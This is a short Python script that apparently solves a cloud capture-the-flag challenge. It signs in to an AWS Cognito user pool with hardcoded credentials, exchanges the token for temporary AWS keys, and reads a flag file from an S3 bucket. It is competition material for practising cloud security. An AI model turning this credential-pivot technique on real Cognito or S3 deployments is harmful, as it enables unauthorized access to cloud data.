import boto3

COGNITO_IDENTITY_POOL_ID = "us-east-1:b73a3094-c689-47e2-b9c4-311d5b7ee1ee"
COGNITO_REGION = "us-east-1"
S3_BUCKET_NAME = "patriot-ctf-cloud-ctf-challenge"
S3_FLAG_FILE = "flag.txt"
COGNITO_CLIENT_ID = "4bjmgsip08ah118ugkau5p946b"
USER_POOL_ID = "us-east-1_uSid13Z6L"

try:
    username = "MasonCC"
    password = "MasonCC@123"

    cognito_client = boto3.client('cognito-identity', region_name=COGNITO_REGION)

    user_pool_response = boto3.client('cognito-idp', region_name=COGNITO_REGION).initiate_auth(
        AuthFlow='USER_PASSWORD_AUTH',
        AuthParameters={
            'USERNAME': username,
            'PASSWORD': password
        },
        ClientId=COGNITO_CLIENT_ID
    )

    access_token = user_pool_response['AuthenticationResult']['IdToken']
    
    identity_response = cognito_client.get_id(
        IdentityPoolId=COGNITO_IDENTITY_POOL_ID,
        Logins={
            f'cognito-idp.{COGNITO_REGION}.amazonaws.com/{USER_POOL_ID}': access_token,
        }
    )
    
    identity_id = identity_response['IdentityId']

    creds_response = cognito_client.get_credentials_for_identity(
        IdentityId=identity_id,
        Logins={
            f'cognito-idp.{COGNITO_REGION}.amazonaws.com/{USER_POOL_ID}': access_token
        }
    )

    credentials = creds_response['Credentials']
    access_key = credentials['AccessKeyId']
    secret_key = credentials['SecretKey']
    session_token = credentials['SessionToken']

    s3_client = boto3.client(
        's3',
        aws_access_key_id=access_key,
        aws_secret_access_key=secret_key,
        aws_session_token=session_token,
        region_name=COGNITO_REGION
    )

    flag_file = s3_client.get_object(Bucket=S3_BUCKET_NAME, Key=S3_FLAG_FILE)
    flag_content = flag_file['Body'].read().decode()

    print(f"Flag: {flag_content}")

except Exception as e:
    print(f"Error: {e}")
